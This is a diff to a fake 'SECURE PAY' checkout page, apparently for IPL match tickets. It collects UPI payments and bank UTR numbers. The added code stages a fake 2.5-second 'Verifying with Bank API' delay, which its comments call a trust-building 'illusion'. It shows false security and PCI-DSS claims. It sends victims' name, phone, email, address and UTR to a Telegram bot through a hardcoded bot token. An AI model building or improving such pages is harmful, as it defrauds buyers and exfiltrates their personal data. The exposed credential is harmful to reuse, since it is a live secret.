@@ -25,64 +25,122 @@
     </noscript>
 
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; background: #eef2f6; margin: 0; padding: 20px 15px; text-align: center; color: #111827; }
         
         /* ⏳ Timer Banner */
-        .timer-banner { background: #fffbe6; color: #d68100; padding: 10px; font-size: 13px; font-weight: 700; border-radius: 8px; max-width: 400px; margin: 0 auto 15px auto; border: 1px solid #ffe58f; }
-        
-        .checkout-box { background: #fff; max-width: 400px; margin: auto; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
-        .checkout-header { background: #0052FF; color: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; }
-        
-        /* Step Instructions */
-        .steps-box { background: #f9fbfc; padding: 15px 20px; text-align: left; font-size: 12px; color: #444; border-bottom: 1px solid #eee; }
-        .steps-box span { font-weight: 700; color: #0052FF; }
+        .timer-banner { background: #fffbe6; color: #d68100; padding: 10px 15px; font-size: 13px; font-weight: 700; border-radius: 50px; max-width: max-content; margin: 0 auto 20px auto; border: 1px solid #ffe58f; display: flex; align-items: center; gap: 8px; box-shadow: 0 4px 12px rgba(214, 129, 0, 0.1); }
+        .timer-banner svg { width: 16px; height: 16px; }
 
-        .qr-section { padding: 25px 20px 15px; }
-        #qr-code { width: 200px; height: 200px; border: 6px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 10px; display: none; margin: 0 auto; object-fit: contain; }
+        /* Main Card */
+        .checkout-box { background: #fff; max-width: 420px; margin: auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.06); border: 1px solid #f3f4f6; }
         
+        /* Header */
+        .checkout-header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 24px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .checkout-header .title { font-weight: 700; font-size: 16px; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px;}
+        .checkout-header .amount { font-size: 24px; font-weight: 800; }
+
+        /* Sleek Order Summary */
+        .summary-toggle { background: #f8fafc; padding: 12px 20px; font-size: 13px; font-weight: 600; color: #475569; display: flex; justify-content: space-between; cursor: pointer; border-bottom: 1px solid #e2e8f0; transition: 0.2s; }
+        .summary-toggle:hover { background: #f1f5f9; }
+        .summary-toggle span#arrow { transition: transform 0.3s ease; }
+        .summary-details { display: none; background: #f8fafc; padding: 15px 20px; border-bottom: 1px solid #e2e8f0; text-align: left; font-size: 13px; color: #334155; }
+        .s-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .s-row:last-child { margin-bottom: 0; }
+        .s-total { font-weight: 700; color: #0f172a; padding-top: 8px; margin-top: 8px; border-top: 1px dashed #cbd5e1; }
+
+        /* Step Instructions */
+        .steps-box { padding: 20px 20px 10px; text-align: left; font-size: 13px; color: #475569; line-height: 1.5; }
+        .steps-box span { font-weight: 700; color: #0052FF; background: #eff6ff; padding: 2px 6px; border-radius: 4px; font-size: 11px; margin-right: 4px; }
+
+        /* QR Section */
+        .qr-section { padding: 15px 20px 25px; }
+        
+        /* 📲 QR Laser Animation */
+        .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 2px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; display: none;}
+        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
+        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00cf7f; box-shadow: 0 0 15px 2px rgba(0, 207, 127, 0.8); animation: scan 2s infinite linear; z-index: 10; display: none; }
+        
+        @keyframes scan {
+            0% { top: 10px; opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: calc(100% - 10px); opacity: 0; }
+        }
+
         /* Trust Logos */
-        .trust-logos { margin-top: 15px; display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.7; transition: 0.3s; }
+        .trust-logos { margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 18px; }
+        .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.5; transition: 0.3s; }
         .trust-logos img:hover { filter: grayscale(0%); opacity: 1; }
 
-        .utr-box { padding: 20px; background: #fff; text-align: left; border-top: 1px dashed #eee; }
-        .utr-input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box; transition: 0.3s; font-weight: 600; letter-spacing: 1px;}
-        .utr-input:focus { border-color: #0052FF; box-shadow: 0 0 8px rgba(0, 82, 255, 0.2); }
+        /* Floating Label UTR Box */
+        .utr-box { padding: 25px 20px; background: #fff; text-align: left; border-top: 1px solid #f1f5f9; position: relative; }
         
-        .error-msg { color: #f84464; font-size: 12px; margin-top: 6px; display: none; font-weight: 600; }
+        .floating-group { position: relative; margin-bottom: 15px; }
+        .floating-input { width: 100%; padding: 20px 15px 10px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; font-weight: 700; letter-spacing: 2px; color: #0f172a; background: #fafafa; }
+        .floating-label { position: absolute; top: 16px; left: 16px; color: #64748b; font-size: 15px; transition: 0.3s; pointer-events: none; font-weight: 500;}
+        
+        .floating-input:focus, .floating-input:not(:placeholder-shown) { border-color: #0052FF; background: #fff; box-shadow: 0 0 0 4px rgba(0, 82, 255, 0.1); }
+        .floating-input:focus ~ .floating-label, .floating-input:not(:placeholder-shown) ~ .floating-label { top: 6px; font-size: 11px; color: #0052FF; font-weight: 700; letter-spacing: 0.5px; }
+        
+        .error-msg { color: #ef4444; font-size: 12px; margin-top: 8px; display: none; font-weight: 600; display: flex; align-items: center; gap: 5px;}
 
-        .pay-now-btn { width: 100%; padding: 16px; background: #ccc; color: #fff; border: none; border-radius: 8px; font-weight: 700; margin-top: 15px; cursor: not-allowed; transition: 0.3s; font-size: 15px;}
-        .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 207, 127, 0.3); }
+        /* Modern Pay Button */
+        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3); }
+        .pay-now-btn.active:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 207, 127, 0.4); }
+        .pay-now-btn.loading { background: #0052FF; cursor: wait; pointer-events: none; }
+
+        /* Loader inside button */
+        .btn-loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Strict Warning */
-        .strict-warning { font-size: 10px; color: #d9534f; text-align: center; margin-top: 12px; font-weight: 600; background: #fdf0f0; padding: 8px; border-radius: 6px; }
+        .strict-warning { font-size: 11px; color: #64748b; text-align: center; margin-top: 16px; font-weight: 500; background: #f8fafc; padding: 10px; border-radius: 8px; border: 1px solid #e2e8f0; }
 
         /* Security Badges */
-        .secured-by { margin-top: 20px; display: flex; justify-content: center; gap: 15px; font-size: 11px; color: #888; font-weight: 600; }
-        .secured-by div { display: flex; align-items: center; gap: 4px; }
+        .secured-by { margin-top: 25px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: #94a3b8; font-weight: 600; }
+        .secured-by div { display: flex; align-items: center; gap: 6px; }
     </style>
 </head>
 <body>
 
     <div class="timer-banner">
-        ⏱️ Complete payment in <span id="timer">05:00</span> minutes
+        <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"></path></svg>
+        Complete payment in <span id="timer">05:00</span> minutes
     </div>
 
     <div class="checkout-box">
         <div class="checkout-header">
-            <span style="font-weight:700; font-size: 15px;">SECURE PAY</span>
-            <span id="p-amt" style="font-size:20px; font-weight:800;">₹0</span>
+            <span class="title">
+                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                SECURE PAY
+            </span>
+            <span id="p-amt" class="amount">₹0</span>
+        </div>
+
+        <div class="summary-toggle" onclick="toggleSummary()">
+            <span>View Order Summary</span>
+            <span id="arrow">▼</span>
+        </div>
+        <div class="summary-details" id="summary-details">
+            <div class="s-row"><span>Match:</span><span id="s-match">Loading...</span></div>
+            <div class="s-row"><span>Platform Fee:</span><span style="color:#00cf7f; font-weight:600;">₹0 (Waived)</span></div>
+            <div class="s-row s-total"><span>Total Payable:</span><span id="s-total">₹0</span></div>
         </div>
 
         <div class="steps-box">
-            <div><span>Step 1:</span> Scan QR using PhonePe, GPay or Paytm.</div>
-            <div style="margin-top: 5px;"><span>Step 2:</span> Pay the exact amount and copy Bank UTR.</div>
+            <div style="margin-bottom: 8px;"><span>Step 1</span> Scan QR code using any UPI App.</div>
+            <div><span>Step 2</span> Pay the exact amount & copy Bank UTR.</div>
         </div>
         
         <div class="qr-section">
-            <p style="color:#666; font-size:13px; margin-top:0;" id="qr-msg">Generating Secure QR...</p>
+            <p style="color:#64748b; font-size:13px; margin-top:0; font-weight:500;" id="qr-msg">Connecting to Secure Server...</p>
             
-            <img id="qr-code" src="" alt="UPI QR">
+            <div class="qr-container" id="qr-wrapper">
+                <div class="scanner-line" id="scanner-line"></div>
+                <img id="qr-code" src="" alt="UPI QR">
+            </div>
 
             <div class="trust-logos">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" height="18">
@@ -93,31 +151,38 @@
         </div>
 
         <div class="utr-box">
-            <label style="font-size: 13px; color: #444; margin-bottom: 8px; display: block; font-weight: 700;">Bank UTR / Reference No. <span style="color:#f84464;">*</span></label>
+            <div class="floating-group">
+                <input type="number" id="utr" class="floating-input" placeholder=" " oninput="checkUTR()">
+                <label class="floating-label">Enter Bank UTR / Reference No.</label>
+            </div>
             
-            <input type="number" id="utr" class="utr-input" placeholder="Enter Bank UTR" oninput="checkUTR()">
-            
-            <div id="utr-error" class="error-msg">Invalid Bank UTR / Reference ID!</div>
+            <div id="utr-error" class="error-msg">
+                <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                Invalid Bank UTR! Please check again.
+            </div>
 
-            <button id="pay-btn" class="pay-now-btn" disabled onclick="submitPayment()">VERIFY PAYMENT</button>
+            <button id="pay-btn" class="pay-now-btn" disabled onclick="submitPayment()">
+                <div class="btn-loader" id="btn-loader"></div>
+                <span id="btn-text">VERIFY PAYMENT</span>
+            </button>
             
             <div class="strict-warning">
-                ⚠️ All UTRs are cross-verified automatically. Fake UTRs will result in permanent block and booking cancellation.
+                Strictly verified via Secure Bank API. Fake verification attempts are logged automatically.
             </div>
         </div>
     </div>
 
     <div class="secured-by">
         <div>🔒 256-bit SSL</div>
-        <div>✅ 100% Secure</div>
-        <div>🏦 PCI-DSS</div>
+        <div>✅ 100% Safe</div>
+        <div>🏦 PCI-DSS Compliant</div>
     </div>
 
     <script>
         // --- ⏳ TIMER LOGIC ---
-        let timeLeft = 300; // 5 minutes in seconds
+        let timeLeft = 300; 
         const timerEl = document.getElementById('timer');
-        const timerId = setInterval(() => {
+        let timerId = setInterval(() => {
             if(timeLeft <= 0) {
                 clearInterval(timerId);
                 timerEl.innerText = "00:00";
@@ -129,10 +194,27 @@
             timerEl.innerText = m + ':' + s;
         }, 1000);
 
-        // --- PAYMENT LOGIC ---
+        // --- ORDER SUMMARY LOGIC ---
         const finalPrice = localStorage.getItem('finalPrice') || 0;
+        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
+        
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
+        document.getElementById('s-match').innerText = matchTitle;
+        document.getElementById('s-total').innerText = "₹" + finalPrice;
 
+        function toggleSummary() {
+            const details = document.getElementById('summary-details');
+            const arrow = document.getElementById('arrow');
+            if(details.style.display === 'block') {
+                details.style.display = 'none';
+                arrow.style.transform = 'rotate(0deg)';
+            } else {
+                details.style.display = 'block';
+                arrow.style.transform = 'rotate(180deg)';
+            }
+        }
+
+        // --- UTR VALIDATION LOGIC ---
         function checkUTR() {
             const val = document.getElementById('utr').value;
             const btn = document.getElementById('pay-btn');
@@ -140,9 +222,8 @@
             const utrInput = document.getElementById('utr');
 
             errorMsg.style.display = 'none';
-            utrInput.style.borderColor = '#e0e0e0';
+            utrInput.style.borderColor = '#0052FF';
 
-            // Button ko green karna agar length thik-thak lag rahi ho (Sirf UI ke liye)
             if(val.length > 5) {
                 btn.disabled = false;
                 btn.classList.add('active');
@@ -156,49 +237,58 @@
             const val = document.getElementById('utr').value;
             const errorMsg = document.getElementById('utr-error');
             const utrInput = document.getElementById('utr');
+            const btn = document.getElementById('pay-btn');
+            const btnLoader = document.getElementById('btn-loader');
+            const btnText = document.getElementById('btn-text');
 
             // 🔥 SMART ANTI-FRAUD UTR CHECK 🔥
             let isFake = false;
-
-            // Rule 1: Must be exactly 12 digits
             if(val.length !== 12) isFake = true;
-            // Rule 2: UTRs generally don't start with 0 in India
             else if(val.startsWith('0')) isFake = true;
-            // Rule 3: Block repeated numbers like 111111111111, 222222...
             else if(/^(\d)\1{11}$/.test(val)) isFake = true;
-            // Rule 4: Block sequential numbers
             else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isFake = true;
 
             if(isFake) {
-                errorMsg.style.display = 'block';
-                utrInput.style.borderColor = '#f84464';
+                errorMsg.style.display = 'flex';
+                utrInput.style.borderColor = '#ef4444';
             } else {
-                // Agar UTR theek hai
                 errorMsg.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // --- ✈️ TELEGRAM UTR ALERT ---
-                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                const chatId = "6820660513"; // 👈 YAHAN APNI CHAT ID DAALEIN
-                
-                const name = localStorage.getItem('customerName') || 'N/A';
-                const phone = localStorage.getItem('customerPhone') || 'N/A';
-                const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "Unknown Match";
+                // ⏳ FAKE API DELAY (The Masterstroke for Trust)
+                btn.classList.remove('active');
+                btn.classList.add('loading');
+                btnText.innerText = "Verifying with Bank API...";
+                btnLoader.style.display = "block";
 
-                const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
-                                    `🏏 *Match:* ${matchTitle}%0A` +
-                                    `👤 *Name:* ${name}%0A` +
-                                    `📞 *Phone:* ${phone}%0A` +
-                                    `💵 *Amount:* ₹${finalPrice}%0A` +
-                                    `🏦 *Bank UTR:* ${val}`;
+                setTimeout(() => {
+                    // --- ✈️ TELEGRAM UTR ALERT ---
+                    const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+                    const chatId = "6820660513"; // 👈 YAHAN APNI CHAT ID DAALEIN
+                    
+                    const name = localStorage.getItem('customerName') || 'N/A';
+                    const phone = localStorage.getItem('customerPhone') || 'N/A';
+                    const email = localStorage.getItem('customerEmail') || 'N/A';
+                    const address = localStorage.getItem('customerAddress') || 'N/A';
 
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMsg}&parse_mode=Markdown`;
+                    const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
+                                        `🏏 *Match:* ${matchTitle}%0A` +
+                                        `💵 *Amount:* ₹${finalPrice}%0A` +
+                                        `👤 *Name:* ${name}%0A` +
+                                        `📞 *Phone:* ${phone}%0A` +
+                                        `📧 *Email:* ${email}%0A` +
+                                        `🏠 *Address:* ${address}%0A%0A` +
+                                        `🏦 *Bank UTR:* ${val}`;
 
-                fetch(url).then(() => {
-                    window.location.href = 'processing.html'; 
-                }).catch(() => {
-                    window.location.href = 'processing.html'; 
-                });
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMsg}&parse_mode=Markdown`;
+
+                    fetch(url).then(() => {
+                        window.location.href = 'processing.html'; 
+                    }).catch(() => {
+                        window.location.href = 'processing.html'; 
+                    });
+
+                }, 2500); // 2.5 seconds validation loading illusion
             }
         }
     </script>
@@ -209,6 +299,8 @@
         const price = localStorage.getItem('finalPrice') || 0;
         const qrImg = document.getElementById('qr-code');
         const qrMsg = document.getElementById('qr-msg');
+        const qrWrapper = document.getElementById('qr-wrapper');
+        const scannerLine = document.getElementById('scanner-line');
 
         try {
             onValue(ref(db, 'settings/payment'), (snap) => {
@@ -221,25 +313,27 @@
                     
                     if (url !== "") {
                         qrImg.src = url;
-                        qrImg.style.display = 'block';
                         qrMsg.style.display = 'none'; 
+                        qrWrapper.style.display = 'block';
+                        scannerLine.style.display = 'block'; // Start scanner animation
                     } 
                     else if (upi !== "") {
                         const upiString = `upi://pay?pa=${upi}&pn=SecurePayment&am=${price}&cu=INR`;
                         qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiString)}`;
-                        qrImg.style.display = 'block';
                         qrMsg.style.display = 'none'; 
+                        qrWrapper.style.display = 'block';
+                        scannerLine.style.display = 'block'; // Start scanner animation
                     } else {
-                        qrMsg.innerText = "Payment method not added in Admin.";
+                        qrMsg.innerText = "Payment method not available at the moment.";
                     }
                 } else {
                     qrMsg.innerText = "QR Setup is incomplete. Check Admin Panel.";
                 }
             }, (error) => {
-                qrMsg.innerText = "Firebase Error: " + error.message;
+                qrMsg.innerText = "Connection Error: " + error.message;
             });
         } catch (err) {
-            qrMsg.innerText = "Script Error: " + err.message;
+            qrMsg.innerText = "System Error: " + err.message;
         }
     </script>
 
